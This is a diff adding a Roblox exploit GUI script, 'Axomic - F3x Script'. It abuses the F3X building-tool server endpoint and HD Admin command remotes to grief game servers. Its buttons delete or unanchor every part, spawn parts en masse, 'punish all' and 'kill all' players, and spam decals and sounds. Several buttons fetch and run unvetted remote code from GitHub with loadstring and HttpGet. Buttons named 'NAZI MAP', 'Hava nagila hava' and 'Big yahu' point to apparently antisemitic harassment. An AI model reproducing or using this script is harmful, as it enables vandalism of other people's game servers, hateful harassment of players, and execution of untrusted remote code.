@@ -1,0 +1,592 @@
+local Rayfield = loadstring(game:HttpGet('https://sirius.menu/rayfield'))()
+
+local Window = Rayfield:CreateWindow({
+    Name = "Axomic - F3x Script",
+    LoadingTitle = "Axomic F3x",
+    LoadingSubtitle = "by Axom",
+    ConfigurationSaving = {
+        Enabled = true,
+        FolderName = "AxomicConfigs",
+        FileName = "F3xScript"
+    },
+    Discord = {
+        Enabled = false,
+        Invite = "noinvitelol",
+        RememberJoins = true
+    },
+    KeySystem = false
+})
+
+local fenv = getfenv()
+
+local HDTab = Window:CreateTab("HD STUFF", 4483362458)
+local HDSection = HDTab:CreateSection("Essential Commands")
+
+HDTab:CreateButton({
+    Name = "btools",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';btools ;BuildingTools')
+    end
+})
+
+HDTab:CreateButton({
+    Name = "R6",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';R6')
+    end
+})
+
+HDTab:CreateButton({
+    Name = "UNJAIL ME",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';unjail me')
+    end
+})
+
+HDTab:CreateButton({
+    Name = "UNFREEZE ME",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';unfreeze me')
+    end
+})
+
+local WeaponsTab = Window:CreateTab("Weapons", 4483362458)
+local WeaponsSection = WeaponsTab:CreateSection("Gear Commands")
+
+WeaponsTab:CreateButton({
+    Name = "GUN",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';gear me 94233344')
+    end
+})
+
+WeaponsTab:CreateButton({
+    Name = "GUN 2",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';gear me 18268645')
+    end
+})
+
+local WorldTab = Window:CreateTab("World", 4483362458)
+local EnvSection = WorldTab:CreateSection("Environment")
+
+WorldTab:CreateButton({
+    Name = "SKYBOX",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        local function skybox(texture)
+            serverendpoint:InvokeServer("SyncTexture", {{Part=workspace.Baseplate, TextureType="Skybox", Texture=texture}})
+        end
+        skybox("rbxassetid://143644903")
+    end
+})
+
+WorldTab:CreateButton({
+    Name = "BASEPLATE",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        serverendpoint:InvokeServer("CreatePart", "Normal", CFrame.new(0, 0, 0) * CFrame.new(0, -3, 0), workspace)
+    end
+})
+
+local PartSection = WorldTab:CreateSection("Part Management")
+
+WorldTab:CreateButton({
+    Name = "COLOR ALL",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        local function color(part, c)
+            serverendpoint:InvokeServer("SyncColor", {{Part=part,Color=c,UnionColoring=false}})
+        end
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") or v:IsA("UnionOperation") then
+                spawn(function() color(v, Color3.new(math.random(0,255)/255, math.random(0,255)/255, math.random(0,255)/255)) end)
+            end
+        end
+    end
+})
+
+WorldTab:CreateButton({
+    Name = "DELETE ALL",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        local function delete(part)
+            serverendpoint:InvokeServer("Remove", {part})
+        end
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") or v:IsA("UnionOperation") then
+                spawn(function() delete(v) end)
+            end
+        end
+    end
+})
+
+WorldTab:CreateButton({
+    Name = "UNANCHOR ALL",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        local function setanchor(part,b)
+            serverendpoint:InvokeServer("SyncAnchor", {{Part=part,Anchored=b}})
+        end
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") or v:IsA("UnionOperation") then
+                spawn(function() setanchor(v, false) end)
+            end
+        end
+    end
+})
+
+WorldTab:CreateButton({
+    Name = "SPAWN PARTS",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        for i = 1, 50 do
+            spawn(function()
+                serverendpoint:InvokeServer("CreatePart", "Normal", (char.Head.CFrame * CFrame.new(0, 50 + i, 0)), workspace)
+            end)
+        end
+    end
+})
+
+local MapsTab = Window:CreateTab("Maps", 4483362458)
+local MapsSection = MapsTab:CreateSection("Map Loaders")
+
+MapsTab:CreateButton({
+    Name = "NDS MAP",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/projectbl1ssofficialenterprise/Bl1ss-gui/refs/heads/main/nds.txt"))()
+    end
+})
+
+MapsTab:CreateButton({
+    Name = "SLAP MAP",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/projectbl1ssofficialenterprise/Bl1ss-gui/refs/heads/main/slap%20tower.txt"))()
+    end
+})
+
+MapsTab:CreateButton({
+    Name = "NAZI MAP",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KryptIT/Obfuscatortest/refs/heads/main/README.md"))()
+    end
+})
+
+MapsTab:CreateButton({
+    Name = "KFC MAP",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KryptIT/Obfuscatortest/refs/heads/main/kfc.lua"))()
+    end
+})
+
+MapsTab:CreateButton({
+    Name = "CROSSROADS MAP",
+    Callback = function()
+        local RequestCommandSilent = game:GetService('ReplicatedStorage'):WaitForChild('HDAdminHDClient').Signals.RequestCommandSilent
+        local player = game.Players.LocalPlayer
+        local char = player.Character
+        local backpack = player.Backpack
+        local function getf3x()
+            for _, v in ipairs(backpack:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            for _, v in ipairs(char:GetChildren()) do if v:FindFirstChild("SyncAPI") then return v end end
+            return nil
+        end
+        local f3x = getf3x()
+        if not f3x then return end
+        local syncapi = f3x.SyncAPI
+        local serverendpoint = syncapi.ServerEndpoint
+        fenv.mate = function(part, material)
+            serverendpoint:InvokeServer('SyncMaterial', {{Part=part, Material=material}})
+        end
+        fenv.Resize = function(part, size, cframe)
+            serverendpoint:InvokeServer('SyncResize', {{Part=part, CFrame=cframe, Size=size}})
+        end
+        fenv.floor = function(part, face)
+            serverendpoint:InvokeServer('SyncTexture', {{TextureType='Texture', StudsPerTileU=2, Part=part, Face=face, StudsPerTileV=2, Texture='rbxassetid://83901588886686'}})
+        end
+        fenv.DestroyPart = function(part)
+            serverendpoint:InvokeServer('Remove', {part})
+        end
+        RequestCommandSilent:InvokeServer(';punish all')
+        task.wait(1)
+        local model = game:GetObjects('rbxassetid://141621194')[1]
+        model.Parent = game.Lighting
+        for _, v in next, model:GetDescendants() do
+            v.Anchored = true
+        end
+        task.wait(10)
+        model.Parent = nil
+        fenv.f3xbuildpart = function() end
+        print('Finished build.')
+        task.wait(5)
+        wait(8)
+        game:GetService('ReplicatedStorage'):WaitForChild('HDAdminHDClient').Signals.RequestCommandSilent:InvokeServer(';respawn all')
+    end
+})
+
+local ThemesTab = Window:CreateTab("Themes", 4483362458)
+local ThemesSection = ThemesTab:CreateSection("Music Commands")
+
+ThemesTab:CreateButton({
+    Name = "G00by theme",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://1841973204"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "fuck him fuck her",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://5367302552"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "Hava nagila hava",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "You get nothing",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "Toxic",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "WONT STOP US C",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "SCATMAN",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "Axom theme",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+ThemesTab:CreateButton({
+    Name = "LOTSA SPAGHET",
+    Callback = function()
+        local sound = Instance.new("Sound")
+        sound.SoundId = "rbxassetid://138697915"
+        sound.Parent = game.Workspace
+        sound:Play()
+    end
+})
+
+local EffectsTab = Window:CreateTab("Effects", 4483362458)
+local DecalSection = EffectsTab:CreateSection("Decal Spam")
+
+EffectsTab:CreateButton({
+    Name = "DECAL SPAM 1",
+    Callback = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://138697915"
+                decal.Face = Enum.NormalId.Front
+                decal.Parent = v
+            end
+        end
+    end
+})
+
+EffectsTab:CreateButton({
+    Name = "Big yahu",
+    Callback = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://138697915"
+                decal.Face = Enum.NormalId.Front
+                decal.Parent = v
+            end
+        end
+    end
+})
+
+EffectsTab:CreateButton({
+    Name = "TD DECAL",
+    Callback = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://138697915"
+                decal.Face = Enum.NormalId.Front
+                decal.Parent = v
+            end
+        end
+    end
+})
+
+EffectsTab:CreateButton({
+    Name = "DECAL SPAM 2",
+    Callback = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local decal = Instance.new("Decal")
+                decal.Texture = "rbxassetid://138697915"
+                decal.Face = Enum.NormalId.Front
+                decal.Parent = v
+            end
+        end
+    end
+})
+
+local PartEffectsSection = EffectsTab:CreateSection("Part Effects")
+
+EffectsTab:CreateButton({
+    Name = "SPARKLES",
+    Callback = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local sparkles = Instance.new("Sparkles")
+                sparkles.Parent = v
+            end
+        end
+    end
+})
+
+EffectsTab:CreateButton({
+    Name = "MESHIFY",
+    Callback = function()
+        for _, v in ipairs(workspace:GetDescendants()) do
+            if v:IsA("BasePart") then
+                local mesh = Instance.new("SpecialMesh")
+                mesh.MeshType = Enum.MeshType.Sphere
+                mesh.Parent = v
+            end
+        end
+    end
+})
+
+EffectsTab:CreateButton({
+    Name = "KILL ALL NEED F3X",
+    Callback = function()
+        for _, v in ipairs(game.Players:GetPlayers()) do
+            if v.Character and v.Character:FindFirstChild("Head") then
+                v.Character.Head:Destroy()
+            end
+        end
+    end
+})
+
+local SpecialTab = Window:CreateTab("Special", 4483362458)
+local SpecialSection = SpecialTab:CreateSection("Advanced Features")
+
+SpecialTab:CreateButton({
+    Name = "Team darius realm",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/projectbl1ssofficialenterprise/Bl1ss-gui/refs/heads/main/nds.txt"))()
+    end
+})
+
+SpecialTab:CreateButton({
+    Name = "AXOM REALM",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/projectbl1ssofficialenterprise/Bl1ss-gui/refs/heads/main/slap%20tower.txt"))()
+    end
+})
+
+SpecialTab:CreateButton({
+    Name = "SHEDLETSKY",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';gear me 94233344')
+    end
+})
+
+SpecialTab:CreateButton({
+    Name = "666",
+    Callback = function()
+        game.Lighting.Ambient = Color3.new(0,0,0)
+        game.Lighting.Brightness = 0
+    end
+})
+
+SpecialTab:CreateButton({
+    Name = "JOHN DOE",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player.Character then
+            player.Character.Head.Mesh:Destroy()
+        end
+    end
+})
+
+SpecialTab:CreateButton({
+    Name = "realm but cafe",
+    Callback = function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/KryptIT/Obfuscatortest/refs/heads/main/kfc.lua"))()
+    end
+})
+
+local InputsTab = Window:CreateTab("Inputs", 4483362458)
+local HintSection = InputsTab:CreateSection("Send Hint")
+
+local hintInput = ""
+
+InputsTab:CreateInput({
+    Name = "Hint Message",
+    PlaceholderText = "Enter hint text...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        hintInput = text
+    end
+})
+
+InputsTab:CreateButton({
+    Name = "Send Hint",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';hint ' .. hintInput)
+    end
+})
+
+local MsgSection = InputsTab:CreateSection("Send ServerMessage")
+
+local msgInput = ""
+
+InputsTab:CreateInput({
+    Name = "Message contents",
+    PlaceholderText = "Enter message text...",
+    RemoveTextAfterFocusLost = false,
+    Callback = function(text)
+        msgInput = text
+    end
+})
+
+InputsTab:CreateButton({
+    Name = "Send Server Message",
+    Callback = function()
+        game:GetService('ReplicatedStorage'):FindFirstChild('HDAdminClient'):FindFirstChild('Signals'):FindFirstChild('RequestCommand'):InvokeServer(';servermessage ' .. msgInput)
+    end
+})
+
+local CreditsTab = Window:CreateTab("Credits", 4483362458)
+local CreditsSection = CreditsTab:CreateSection("Special Thanks")
+
+CreditsTab:CreateParagraph("Special Thanks", "• Footagesus – WindUI Library\n• All contributors & testers\n• Explotier community\n• You for using this GUI!")
+
+CreditsTab:CreateButton({
+    Name = "Copy Credits",
+    Callback = function()
+        setclipboard("Axom - F3x Script\nCredits: Axom")
+    end
+})
+
+local VersionSection = CreditsTab:CreateSection("Version")
+CreditsTab:CreateParagraph("Version", "Version 8.9.0 • 2026")
+
+Rayfield:Notify({
+    Title = "Axomic F3x",
+    Content = "Loaded successfully!",
+    Duration = 3
+})
